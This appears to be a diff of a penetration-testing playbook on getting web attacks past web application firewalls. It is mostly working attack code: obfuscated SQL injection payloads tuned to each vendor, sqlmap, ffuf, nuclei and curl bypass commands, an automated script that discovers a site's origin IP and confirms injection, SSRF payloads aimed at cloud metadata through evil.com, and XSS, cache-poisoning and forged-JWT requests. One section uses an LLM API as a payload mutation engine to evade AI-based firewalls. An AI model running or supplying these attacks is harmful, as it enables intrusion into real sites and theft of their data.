+    for kw in KEYWORDS:
+        pattern = re.compile(re.escape(kw), re.IGNORECASE)
+        result = pattern.sub(f'/*!50000{kw}*/', result)
+
+    # Step 2: Replace spaces with random whitespace equivalent
+    whitespace = ['/**/', '%09', '%0a', '%0d']
+    result = result.replace(' ', random.choice(whitespace))
+
+    # Step 3: Random case remaining keywords
+    def rand_case(match):
+        word = match.group(0)
+        return ''.join(c.upper() if random.random() > 0.5 else c.lower()
+                      for c in word)
+
+    result = re.sub(r'[a-zA-Z]+', rand_case, result)
+
+    return result
 ```
 
-## PHASE 17 — FFUF WAF BYPASS FLAGS
+**sqlmap Flags for WAF Bypass**
+```bash
+sqlmap -u "https://TARGET/?id=1" \
+  --level=5 \           # Max test depth (1-5)
+  --risk=3 \            # Max risk level (1-3)
+  --technique=BEUSTQ \  # All techniques: Boolean, Error, Union, Stacked, Time, Query
+  --dbms=mysql \        # Skip DB fingerprinting overhead
+  --random-agent \      # Random User-Agent
+  --delay=2 \           # Delay between requests (evasion)
+  --timeout=30 \
+  --retries=3 \
+  --skip-urlencode \    # Don't double-encode
+  --no-cast \           # Disable CHAR casting (triggers some WAF rules)
+  --hex \               # Use hex encoding
+  --prefix="'" \        # Custom prefix
+  --suffix="--+" \      # Custom suffix
+  --tamper="space2comment,randomcase" \
+  --proxy="http://127.0.0.1:8080" \  # Route through Burp
+  --threads=1           # Single thread for stealth
+```
+
+### 12.2 ffuf WAF Bypass Configuration
 
 ```bash
-TARGET_URL="https://target.com/FUZZ"
-WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
-
-# Basic ffuf with WAF evasion
-ffuf -u "$TARGET_URL" -w $WORDLIST \
+# Standard ffuf with WAF bypass headers
+ffuf -u "https://TARGET/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
   -H "X-Forwarded-For: 127.0.0.1" \
   -H "X-Real-IP: 127.0.0.1" \
   -mc 200,204,301,302,307,401,403 \
-  -t 10 \
-  -p 0.1-0.5 \
-  -timeout 10 \
-  -c -v | tee ffuf_waf_bypass.txt
+  -fc 429 \              # Filter rate-limit responses
+  -p 0.1-0.5 \           # Random delay 100-500ms (evasion)
+  -rate 50 \             # Max 50 req/sec
+  -t 10
 
-# ffuf with random delay and User-Agent rotation
-ffuf -u "$TARGET_URL" -w $WORDLIST \
-  -H "User-Agent: FUZZ2" -w /usr/share/seclists/Fuzzing/User-Agents/user-agents.txt:FUZZ2 \
-  -mc 200,204,301,302 -t 5 -p 0.5-2.0 | tee ffuf_ua_rotate.txt
-
-# ffuf for parameter fuzzing with WAF evasion
-ffuf -u "$TARGET_URL/api/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+# POST parameter fuzzing
+ffuf -u "https://TARGET/api/search" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"query":"FUZZ"}' \
+  -w payloads/sqli.txt \
   -H "User-Agent: Mozilla/5.0" \
-  -H "Accept: application/json" \
-  -mc 200,201 -t 5 -p 0.2 | tee ffuf_params.txt
+  -mc all \
+  -fc 403,429
 
-# ffuf fuzzing for SQLi with bypass payloads
-cat > /tmp/sqli_fuzz.txt << 'FUZZLIST'
-1'+OR+'1'='1
-1/**/OR/**/1=1--
-1/*!OR*/1=1--
-1%0aOR%0a1=1--
-1 UNION/**/SELECT/**/1,2,3--
-1'+UNION+SELECT+1,2,3--
-FUZZLIST
-
-ffuf -u "${TARGET_URL/FUZZ/}api/products?id=FUZZ" \
-  -w /tmp/sqli_fuzz.txt \
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
-  -mc 200 -t 5 -p 1.0 \
-  -fs 0 \
-  -ac | tee ffuf_sqli_waf.txt
+# Custom header injection for WAF bypass testing
+ffuf -u "https://TARGET/admin" \
+  -H "FUZZ: 127.0.0.1" \
+  -w headers_that_bypass.txt \
+  -mc 200 \
+  -v
 ```
 
-## PHASE 18 — BYPASS DECISION TREE (ASCII)
+### 12.3 nuclei WAF Bypass Templates
 
-```
-START: Attack is being blocked (403/406/429/503)
-                |
-                v
-    +---------------------------+
-    |  Identify WAF vendor      |
-    |  (wafw00f, headers,       |
-    |   response body)          |
-    +---------------------------+
-                |
-        +-------+-------+
-        |               |
-   Cloudflare?      ModSec/Other?
-        |               |
-        v               v
-  Find Origin IP   Check Paranoia Level
-  (10 methods)     (test with known
-        |           bypass set)
-        v               |
-  Direct IP access?     v
-  (Host: target.com)  PL1/2? -> space2comment
-        |             PL3/4? -> OOB timing / IP
-        |
-        v
-  Still blocked?
-        |
-        +---> Try encoding bypass
-        |      - URL encode
-        |      - Double URL encode
-        |      - Unicode (fullwidth)
-        |      - HTML entities
-        |      - Null byte
-        |
-        +---> Try HTTP-level bypass
-        |      - Chunked encoding
-        |      - IP spoofing headers
-        |      - Content-Type change
-        |      - Method override
-        |      - HTTP/2 request
-        |      - Slow HTTP
-        |
-        +---> Try comment/whitespace bypass
-        |      - /**/ between keywords
-        |      - /*!...*/  version comment
-        |      - Newline (%0a, %0d)
-        |      - Tab (%09)
-        |
-        +---> Try case variation
-        |      - SeLeCt, uNiOn
-        |      - Mixed encoding
-        |
-        +---> Try keyword bypass
-        |      - Double keyword: OORR
-        |      - Split with comment: O/**/R
-        |      - Alternative operators: LIKE for =
-        |
-        +---> Try OOB technique
-        |      - DNS exfiltration
-        |      - Time-based blind
-        |      - Burp Collaborator
-        |
-        +---> Try payload split
-               - Split across multiple parameters
-               - Use array parameters: id[]=1&id[]=2
-               - HPP (HTTP Parameter Pollution)
+```yaml
+# Custom nuclei template for WAF fingerprinting
+id: waf-fingerprint-advanced
 
-                    |
-                    v
-          If all inline bypasses fail:
-          +------------------------------+
-          | Pivot to different vuln class |
-          | - Test other parameters       |
-          | - Test other endpoints        |
-          | - Switch from SQLi to SSRF    |
-          | - Try blind/OOB variants      |
-          +------------------------------+
+info:
+  name: Advanced WAF Fingerprinting
+  author: pi
+  severity: info
+  tags: waf,fingerprint
+
+requests:
+  - raw:
+      - |
+        GET /?id=1'%20OR%20'1'='1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept: */*
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "cloudflare"
+          - "Sorry, you have been blocked"
+        part: body
+        name: cloudflare
+
+      - type: word
+        words:
+          - "FORTIWAFSID"
+        part: header
+        name: fortiweb
+
+      - type: word
+        words:
+          - "visid_incap"
+          - "nlbi_"
+        part: header
+        name: imperva
+
+      - type: status
+        status:
+          - 403
+        name: generic-block
 ```
 
-## PHASE 19 — WAF BYPASS FOR SPECIFIC VULN CLASSES
+```yaml
+# nuclei template with WAF bypass headers built in
+id: sqli-waf-bypass
+
+info:
+  name: SQLi with WAF Bypass Headers
+  author: pi
+  severity: high
+  tags: sqli,waf-bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
+      - "{{BaseURL}}/?id=1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
+      - "{{BaseURL}}/?id=1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"
+
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+      X-Real-IP: "127.0.0.1"
+      User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
+
+    matchers:
+      - type: regex
+        regex:
+          - "([0-9]+\\.[0-9]+\\.[0-9]+-[Mm]ari[aA]|[0-9]+\\.[0-9]+\\.[0-9]+-[Mm]y[Ss][Qq][Ll])"
+```
+
+### 12.4 curl WAF Bypass One-Liners
 
 ```bash
-TARGET_URL="https://target.com"
+# Test with all common bypass headers
+curl -sk "https://TARGET/?id=1'OR'1'='1" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "Accept-Language: en-US,en;q=0.9" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+  -H "Referer: https://www.google.com/"
 
-# SSRF bypass through WAF
-SSRF_BYPASSES=(
-  "http://169.254.169.254/"
-  "http://169.254.169.254.nip.io/"
-  "http://[::ffff:169.254.169.254]/"
-  "http://[::ffff:a9fe:a9fe]/"
-  "http://0xA9FEA9FE/"
-  "http://2852039166/"          # decimal of 169.254.169.254
-  "http://0251.0376.0251.0376/" # octal
-  "http://169.254.169.254:80@evil.com/"
-  "http://evil.com@169.254.169.254/"
-  "http://169.254.169.254%23.evil.com/"
-  "http://169.254.169.254%2fevil.com/"
+# Chunked transfer encoding
+curl -sk "https://TARGET/search" \
+  -X POST \
+  -H "Transfer-Encoding: chunked" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "q=1' UNION SELECT 1,2,3--"
+
+# Multipart bypass
+curl -sk "https://TARGET/upload" \
+  -F "file=@/dev/null" \
+  -F "q=1' UNION SELECT 1,2,3--"
+
+# JSON with unicode bypass
+curl -sk "https://TARGET/api" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"q":"\u0031\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d"}'
+
+# HTTP/2 with curl
+curl -sk --http2 "https://TARGET/?id=1'OR'1'='1" \
+  -H "User-Agent: Mozilla/5.0"
+
+# Test origin IP directly
+curl -sk "https://ORIGIN_IP/?id=1'OR'1'='1" \
+  --insecure \
+  -H "Host: TARGET.COM"
+```
+
+---
+
+## 13. AUTOMATED WAF BYPASS WORKFLOW
+
+```bash
+#!/usr/bin/env bash
+# waf_bypass_auto.sh — Automated WAF bypass testing workflow
+# Usage: ./waf_bypass_auto.sh TARGET.COM
+# Authorized testing only
+
+TARGET="${1:-TARGET.COM}"
+WORKSPACE="/tmp/waf_bypass_$(date +%s)_${TARGET//[^a-zA-Z0-9]/_}"
+mkdir -p "$WORKSPACE"/{fingerprint,origin,bypass,results}
+
+log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$WORKSPACE/continuous.md"; }
+
+# ── STEP 1: DETECT WAF PRESENCE ─────────────────────────────────────────────
+log "=== STEP 1: WAF Detection ==="
+
+BASELINE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/")
+SQLI_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=1%27OR%271%27%3D%271")
+XSS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
+LFI_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?file=../../etc/passwd")
+
+log "Baseline: $BASELINE | SQLi: $SQLI_CODE | XSS: $XSS_CODE | LFI: $LFI_CODE"
+
+if [ "$SQLI_CODE" = "403" ] || [ "$XSS_CODE" = "403" ] || [ "$LFI_CODE" = "403" ]; then
+  WAF_PRESENT=true
+  log "[+] WAF DETECTED (blocking attack patterns)"
+else
+  WAF_PRESENT=false
+  log "[-] No WAF detected — proceeding directly to exploitation"
+fi
+
+# ── STEP 2: FINGERPRINT VENDOR ───────────────────────────────────────────────
+log "=== STEP 2: WAF Fingerprinting ==="
+
+HEADERS=$(curl -ski "https://${TARGET}/?id=1%27" 2>&1)
+echo "$HEADERS" > "$WORKSPACE/fingerprint/headers.txt"
+
+# Score each vendor
+SCORE_CF=0; SCORE_AWS=0; SCORE_IMP=0; SCORE_AKAMAI=0; SCORE_MODSEC=0
+
+echo "$HEADERS" | grep -qi "cloudflare" && SCORE_CF=$((SCORE_CF+30))
+echo "$HEADERS" | grep -qi "cf_clearance\|__cfduid" && SCORE_CF=$((SCORE_CF+20))
+echo "$HEADERS" | grep -qi "X-Amzn-RequestId\|x-amz-cf-id" && SCORE_AWS=$((SCORE_AWS+25))
+echo "$HEADERS" | grep -qi "visid_incap\|nlbi_\|X-Iinfo" && SCORE_IMP=$((SCORE_IMP+30))
+echo "$HEADERS" | grep -qi "AkamaiGHost\|ak_bmsc\|bm_sv" && SCORE_AKAMAI=$((SCORE_AKAMAI+30))
+echo "$HEADERS" | grep -qi "406 Not Acceptable\|Mod_Security\|NOYB" && SCORE_MODSEC=$((SCORE_MODSEC+25))
+
+# Check block page body
+BODY=$(curl -sk "https://${TARGET}/?id=1%27OR%271%27%3D%271")
+echo "$BODY" | grep -qi "cloudflare\|been blocked" && SCORE_CF=$((SCORE_CF+30))
+echo "$BODY" | grep -qi "incapsula\|Error 16" && SCORE_IMP=$((SCORE_IMP+30))
+
+log "Scores — Cloudflare:$SCORE_CF AWS:$SCORE_AWS Imperva:$SCORE_IMP Akamai:$SCORE_AKAMAI ModSec:$SCORE_MODSEC"
+
+# Identify top vendor
+VENDOR="Unknown"
+MAX=0
+for V_SCORE in "Cloudflare:$SCORE_CF" "AWS:$SCORE_AWS" "Imperva:$SCORE_IMP" "Akamai:$SCORE_AKAMAI" "ModSecurity:$SCORE_MODSEC"; do
+  V="${V_SCORE%%:*}"; S="${V_SCORE##*:}"
+  [ "$S" -gt "$MAX" ] && MAX="$S" && VENDOR="$V"
+done
+log "[+] Detected WAF vendor: $VENDOR (confidence: $MAX/100)"
+
+# ── STEP 3: ORIGIN IP DISCOVERY ─────────────────────────────────────────────
+log "=== STEP 3: Origin IP Discovery ==="
+
+ORIGIN_IPS=()
+
+# Method 1: Historical DNS
+log "Checking SecurityTrails..."
+ST_IPS=$(curl -s "https://api.securitytrails.com/v1/history/${TARGET}/dns/a" \
+  -H "APIKEY: ${SECURITYTRAILS_KEY:-''}" 2>/dev/null | jq -r '.records[].values[].ip' 2>/dev/null)
+[ -n "$ST_IPS" ] && ORIGIN_IPS+=($ST_IPS) && log "SecurityTrails: $ST_IPS"
+
+# Method 2: Certificate transparency
+log "Checking crt.sh..."
+CT_SUBS=$(curl -s "https://crt.sh/?q=%.${TARGET}&output=json" 2>/dev/null | \
+  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u)
+for sub in $CT_SUBS; do
+  IP=$(dig +short "$sub" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
+  if [ -n "$IP" ]; then
+    CF_CHECK=$(echo "$IP" | grep -cE "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.41\.)" || true)
+    [ "$CF_CHECK" = "0" ] && ORIGIN_IPS+=("$IP") && log "Non-CDN IP via subdomain $sub: $IP"
+  fi
+done
+
+# Method 3: Common direct-access subdomains
+for SUB in direct origin backend server api-origin mail smtp; do
+  IP=$(dig +short "${SUB}.${TARGET}" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
+  [ -n "$IP" ] && ORIGIN_IPS+=("$IP") && log "Direct subdomain ${SUB}: $IP"
+done
+
+# Deduplicate and test
+UNIQUE_IPS=($(printf '%s\n' "${ORIGIN_IPS[@]}" | sort -u))
+log "Testing ${#UNIQUE_IPS[@]} candidate origin IPs..."
+
+for IP in "${UNIQUE_IPS[@]}"; do
+  CODE=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" \
+    "http://${IP}/" -H "Host: ${TARGET}" 2>/dev/null)
+  if [ "$CODE" != "000" ]; then
+    log "[ORIGIN CANDIDATE] $IP → HTTP $CODE"
+    # Test if WAF bypass works against this IP
+    BYPASS_CODE=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" \
+      "http://${IP}/?id=1'OR'1'='1" -H "Host: ${TARGET}" 2>/dev/null)
+    log "  Attack probe against $IP: HTTP $BYPASS_CODE"
+    [ "$BYPASS_CODE" != "403" ] && log "  [!!!] ORIGIN BYPASS CONFIRMED: $IP" && \
+      echo "$IP" >> "$WORKSPACE/origin/confirmed_origins.txt"
+  fi
+done
+
+# ── STEP 4: PAYLOAD BYPASS TESTING ──────────────────────────────────────────
+log "=== STEP 4: Payload Bypass Testing ==="
+
+# Build bypass payload list based on detected vendor
+case "$VENDOR" in
+  Cloudflare)
+    PAYLOADS=(
+      "1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"
+      "1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
+      "1'%0aUNION%0aSELECT%0a1,2,@@version--+-"
+    );;
+  AWS)
+    PAYLOADS=(
+      "1' UNION%0aSELECT%0a1,2,@@version--+-"
+      "1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
+      "1' uNiOn SeLeCt 1,2,@@VERSION--+-"
+    );;
+  ModSecurity)
+    PAYLOADS=(
+      "1'/*!UNION*//*!SELECT*/1,2,@@version--+-"
+      "1'%09UNION%09SELECT%091,2,@@version--+-"
+      "1'%0bUNION%0bSELECT%0b1,2,@@version--+-"
+    );;
+  *)
+    PAYLOADS=(
+      "1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"
+      "1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
+      "1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
+      "1'%09UNION%09SELECT%091,2,@@version--"
+      "1'%0aUNION%0aSELECT%0a1,user(),3--"
+    );;
+esac
+
+BYPASS_HEADERS=(
+  "X-Forwarded-For: 127.0.0.1"
+  "X-Real-IP: 127.0.0.1"
+  "X-Originating-IP: 127.0.0.1"
+  "True-Client-IP: 127.0.0.1"
 )
 
-for ssrf in "${SSRF_BYPASSES[@]}"; do
-  ENC=$(python3 -c "import
+for PAYLOAD in "${PAYLOADS[@]}"; do
+  ENC_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}', safe=''))" 2>/dev/null || echo "$PAYLOAD")
+  
+  # Test without bypass headers
+  CODE1=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=${ENC_PAYLOAD}")
+  
+  # Test with IP spoofing headers
+  CODE2=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=${ENC_PAYLOAD}" \
+    -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1")
+  
+  log "Payload [${CODE1}→${CODE2}]: ${PAYLOAD:0:60}"
+  [ "$CODE1" != "403" ] && echo "BYPASS: $PAYLOAD" >> "$WORKSPACE/bypass/working_payloads.txt"
+done
+
+# ── STEP 5: VALIDATE BYPASS ──────────────────────────────────────────────────
+log "=== STEP 5: Validating Bypasses ==="
+
+if [ -s "$WORKSPACE/bypass/working_payloads.txt" ]; then
+  log "[+] Working bypass payloads found!"
+  cat "$WORKSPACE/bypass/working_payloads.txt"
+  
+  # Try to get actual SQLi output
+  while IFS= read -r PAYLOAD; do
+    RESPONSE=$(curl -sk "https://${TARGET}/?id=${PAYLOAD}")
+    VERSION=$(echo "$RESPONSE" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+-[A-Za-z]+')
+    [ -n "$VERSION" ] && log "[!!!] SQL INJECTION CONFIRMED — DB Version: $VERSION"
+  done < "$WORKSPACE/bypass/working_payloads.txt"
+fi
+
+log "=== WORKFLOW COMPLETE ==="
+log "Results saved to: $WORKSPACE"
+ls -la "$WORKSPACE/"*/
+```
+
+---
+
+## 14. 2024-2025 CUTTING EDGE TECHNIQUES
+
+### 14.1 LLM-Powered WAF Bypass
+
+```python
+#!/usr/bin/env python3
+# Use Claude/GPT API to mutate payloads that bypass ML-based WAFs
+
+import anthropic
+import requests
+
+client = anthropic.Anthropic()
+
+def mutate_payload_with_llm(original_payload: str, waf_vendor: str, vuln_type: str) -> list[str]:
+    """Generate WAF-evading payload variants using Claude."""
+    
+    message = client.messages.create(
+        model="claude-opus-4-5",
+        max_tokens=2048,
+        messages=[{
+            "role": "user",
+            "content": f"""You are a payload mutation engine for authorized penetration testing.
+            
+Mutate this {vuln_type} payload to evade {waf_vendor} WAF signatures.
+Generate 10 distinct variants using different obfuscation techniques.
+
+Original payload: {original_payload}
+
+For each variant, use a different technique:
+- Comment injection
+- Case variation  
+- Encoding (URL, Unicode, hex)
+- Whitespace substitution
+- Function equivalents
+- String fragmentation
+- Null byte injection
+- Version comments (for MySQL)
+
+Return ONLY the payload variants, one per line, no explanations."""
+        }]
+    )
+    
+    variants = message.content[0].text.strip().split('\n')
+    return [v.strip() for v in variants if v.strip()]
+
+def test_payloads(target: str, param: str, payloads: list[str]) -> list[str]:
+    """Test each payload variant and return those that bypass WAF."""
+    working = []
+    for payload in payloads:
+        try:
+            r = requests.get(target, params={param: payload}, timeout=10, verify=False)
+            if r.status_code != 403 and r.status_code != 429:
+                working.append(payload)
+                print(f"[BYPASS] {payload[:80]} → HTTP {r.status_code}")
+        except Exception as e:
+            pass
+    return working
+
+# Example usage
+original = "' UNION SELECT 1,user(),3--"
+variants = mutate_payload_with_llm(original, "Cloudflare", "SQLi")
+working = test_payloads("https://TARGET.COM/search", "q", variants)
+```
+
+### 14.2 ML Model Confusion Attacks on AI-Based WAFs
+
+```python
+# AI WAFs use ML classifiers — attack the classifier itself
+# Techniques: adversarial examples, feature poisoning, evasion
+
+# Technique 1: Add benign context to confuse classifier score
+# Classifier sees "SELECT" and scores high — dilute with legitimate SQL terms
+malicious = "' UNION SELECT username,password FROM users--"
+# Wrap with benign SQL-like content that lowers anomaly score
+confused = f"1 ORDER BY 1 HAVING 1=1 GROUP BY 1 {malicious} LIMIT 1 OFFSET 0"
+
+# Technique 2: Semantic similarity attack
+# WAF trained on known payloads — use uncommon but equivalent syntax
+# Instead of: SELECT
+# Use MySQL-specific: TABLE (MySQL 8.0+)
+# TABLE users → equivalent to SELECT * FROM users in MySQL 8.0+
+alt_payload = "1 UNION TABLE information_schema.tables LIMIT 3--"
+
+# Technique 3: Feature vector manipulation
+# ML WAFs extract features (token count, special char ratio, etc.)
+# Add padding to normalize feature vector to benign range
+import random, string
+padding = ''.join(random.choices(string.ascii_lowercase, k=500))
+payload_with_padding = f"q={padding}&id=1'OR'1'='1"
+
+# Technique 4: Context window overflow
+# Some AI WAFs only inspect first N characters
+large_prefix = "a" * 8192
+bypass = large_prefix + "' UNION SELECT 1,2,3--"
+```
+
+### 14.3 HTTP/3 QUIC Protocol WAF Bypass
+
+```bash
+# Many WAFs don't inspect HTTP/3 traffic properly yet (2024)
+# curl with HTTP/3 support (requires --with-ngtcp2 build)
+
+curl --http3 "https://TARGET/?id=1'OR'1'='1" \
+  -H "User-Agent: Mozilla/5.0" \
+  -v
+
+# Test if HTTP/3 bypasses WAF
+# Compare responses: HTTP/1.1 vs HTTP/3
+HTTP1_CODE=$(curl --http1.1 -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%27OR%271%27%3D%271")
+HTTP3_CODE=$(curl --http3 -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%27OR%271%27%3D%271" 2>/dev/null || echo "N/A")
+echo "HTTP/1.1: $HTTP1_CODE | HTTP/3: $HTTP3_CODE"
+
+# quiche-based HTTP/3 client
+# https://github.com/cloudflare/quiche
+./quiche-client "https://TARGET/?id=1'OR'1'='1"
+```
+
+### 14.4 JSON Smuggling Bypass
+
+```bash
+# Nested JSON structures confuse WAF parsers
+# WAF parses outer JSON, app parses inner differently
+
+# Double JSON encoding
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"data":"{\"query\":\"1 UNION SELECT 1,2,3--\"}"}'
+
+# JSON with comments (non-standard but some parsers accept)
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"query": /* benign comment */ "1 UNION SELECT 1,2,3--"}'
+
+# JSON with trailing data
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"safe"}{"query":"1 UNION SELECT 1,2,3--"}'
+
+# Null bytes in JSON keys (some parsers truncate at null)
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d "{\"quer\x00y\":\"1 UNION SELECT 1,2,3--\"}"
+
+# Unicode JSON key confusion
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"quer\u0079":"1 UNION SELECT 1,2,3--"}'
+```
+
+### 14.5 GraphQL WAF Bypass
+
+```bash
+# GraphQL often gets less WAF scrutiny than REST
+
+# Aliases to exfiltrate same field multiple times
+curl -X POST "https://TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ a: user(id:\"1 OR 1=1\") { username } b: user(id:\"1\") { email } }"}'
+
+# Introspection (if not disabled — reveals entire schema)
+curl -X POST "https://TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
+
+# Field suggestions (leaks schema via error messages)
+curl -X POST "https://TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ usr { name } }"}'
+
+# Batching attack (rate limit bypass)
+curl -X POST "https://TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"query":"mutation { login(user:\"admin\",pass:\"pass1\") }"},
+    {"query":"mutation { login(user:\"admin\",pass:\"pass2\") }"},
+    {"query":"mutation { login(user:\"admin\",pass:\"pass3\") }"}
+  ]'
+
+# Fragment injection
+curl -X POST "https://TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"fragment f on User { id username password } { user(id:1) { ...f } }"}'
+```
+
+### 14.6 WebSocket WAF Bypass
+
+```python
+import websocket
+import json
+
+# WebSocket connections often bypass HTTP WAF inspection
+# Most WAFs inspect HTTP upgrade but not WebSocket frames
+
+def ws_sqli_bypass(target_ws_url: str, payload: str):
+    """Send SQLi payload over WebSocket to bypass HTTP WAF."""
+    
+    ws = websocket.create_connection(
+        target_ws_url,
+        header={
+            "User-Agent": "Mozilla/5.0",
+            "Origin": "https://TARGET.COM"
+        }
+    )
+    
+    # Send attack payload as WebSocket message
+    ws.send(json.dumps({"query": payload, "type": "search"}))
+    result = ws.recv()
+    ws.close()
+    return result
+
+# Test SQLi via WebSocket
+result = ws_sqli_bypass(
+    "wss://TARGET.COM/ws",
+    "1' UNION SELECT 1,user(),3--"
+)
+print(result)
+```
+
+```bash
+# wscat for WebSocket testing
+wscat -c "wss://TARGET.COM/ws" \
+  -H "Origin: https://TARGET.COM" \
+  --execute '{"query":"1'"'"' UNION SELECT 1,2,3--"}'
+
+# websocat (more control)
+echo '{"id":"1'"'"' OR '"'"'1'"'"'='"'"'1"}' | \
+  websocat "wss://TARGET.COM/ws" \
+  --header "Origin: https://TARGET.COM"
+```
+
+### 14.7 Prototype Pollution WAF Bypass
+
+```javascript
+// Prototype pollution can affect WAF client-side filtering
+// Or pollute server-side objects used in WAF bypass checks
+
+// Classic PP payload in GET parameter
+// ?__proto__[admin]=true
+// ?constructor[prototype][isAdmin]=true
+
+// PP to bypass server-side WAF logic written in Node.js
+// If WAF checks: if (req.body.blocked) { block(); }
+// Pollute: {"__proto__":{"blocked":false}, "payload":"<script>alert(1)</script>"}
+
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"blocked":false,"allowed":true},"data":"<script>alert(1)</script>"}'
+
+// PP via URL query string
+curl "https://TARGET/?__proto__[blocked]=false&q=<script>alert(1)</script>"
+curl "https://TARGET/?constructor%5Bprototype%5D%5Ballowed%5D=1&q=<script>alert(1)</script>"
+```
+
+### 14.8 Cache Poisoning to Bypass WAF
+
+```bash
+# Poison cache with unblocked response, serve payload to subsequent users
+# Web Cache Deception variant
+
+# Step 1: Find cacheable endpoint
+# Step 2: Inject payload in non-inspected header that gets cached
+curl -sk "https://TARGET/api/user" \
+  -H "X-Forwarded-Host: evil.com" \
+  -H "X-Forwarded-Scheme: http" \
+  -H "Cache-Control: max-age=3600"
+
+# Param cloaking — WAF sees different params than cache key
+# Cache key: /page?lang=en
+# WAF inspects: /page?lang=en&xss=<script>alert(1)</script>
+# Cache stores response for /page?lang=en WITH xss payload executed
+
+curl "https://TARGET/page?lang=en&utm_content=<script>alert(1)</script>"
+
+# Fat GET (body in GET request confuses WAF, body gets cached)
+curl -X GET "https://TARGET/api/search" \
+  -H "Content-Type: application/json" \
+  -d '{"q":"<script>alert(1)</script>"}'
+```
+
+### 14.9 JWT Header Injection WAF Bypass
+
+```bash
+# JWTs in Authorization header often bypass content-inspection WAFs
+# WAF focuses on GET/POST params, not JWT claims
+
+# Create malicious JWT with SQLi in claims (no signature verification)
+python3 -c "
+import base64, json
+
+header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+payload = base64.b64encode(json.dumps({
+    'sub': \"1' UNION SELECT 1,user(),3--\",
+    'role': '<script>alert(1)</script>',
+    'iat': 9999999999
+}).encode()).rstrip(b'=').decode()
+print(f'{header}.{payload}.')
+"
+
+# Use with curl
+TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxJyBVTklPTiBTRUxFQ1QgMSx1c2VyKCksMy0tIiwicm9sZSI6IjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4iLCJpYXQiOjk5OTk5OTk5OTl9."
+curl -sk "https://TARGET/api/profile" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+### 14.10 gRPC WAF Bypass
+
+```bash
+# gRPC uses HTTP/2 with Protocol Buffers — most WAFs don't inspect protobuf
+# grpcurl for testing
+
+# List gRPC services
+grpcurl -plaintext TARGET:50051 list
+
+# Invoke with SQLi payload in string field
+grpcurl -plaintext -d '{"query":"1'"'"' UNION SELECT 1,2,3--"}' \
+  TARGET:50051 search.SearchService/Search
+
+# grpc-gateway REST transcoding bypass
+# gRPC-Gateway translates REST→gRPC; attack the REST interface
